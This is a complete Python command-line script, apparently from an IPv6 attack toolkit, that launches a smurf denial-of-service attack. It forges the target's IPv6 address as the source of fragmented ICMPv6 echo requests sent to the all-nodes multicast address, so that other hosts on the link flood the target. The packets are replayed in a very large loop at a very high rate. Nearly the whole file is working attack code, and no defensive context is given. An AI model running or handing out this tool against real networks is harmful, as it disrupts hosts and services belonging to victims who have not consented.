#!/usr/bin/python3
import argparse
import sys

import netifaces
import netifaces as ni
import psutil
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, fragment6
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendpfast
from scapy.volatile import RandString, RandShort

from validate_parameters import is_valid_ipv6


def main():
    parser = argparse.ArgumentParser(description="Triggering smurf attack to a specified target (using other hosts to "
                                                 "flood the target).")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-tip", dest="target_ip", action="store",
                        help="the IPv6 address of target")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the target IPv6 address
    if args.target_ip is None:
        print("---> IPv6 address of the target is required!!!")
        sys.exit(1)
    if args.target_ip is not None:
        if not is_valid_ipv6(args.target_ip):
            print("---> The given target IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Generate the packet
    source_mac = get_if_hwaddr(args.interface)
    stats = psutil.net_if_stats()
    mtu = stats.get(args.interface).mtu
    data = RandString(1000)
    id = RandShort()

    pkt_list = []
    print("Triggering the smurf attack to the target: " + args.target_ip + " (press Ctrl+C to stop the attack).....")
    packet1 = Ether(src=source_mac) / IPv6(src=args.target_ip, dst="ff02::1", hlim=128) / \
              ICMPv6EchoRequest(id=id, data=data)
    packet1 = fragment6(packet1, mtu)
    for i in range(5000):
        pkt_list.append(packet1)
    try:
        sendpfast(pkt_list, mbps=60000, loop=5000000, iface=args.interface)
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    main()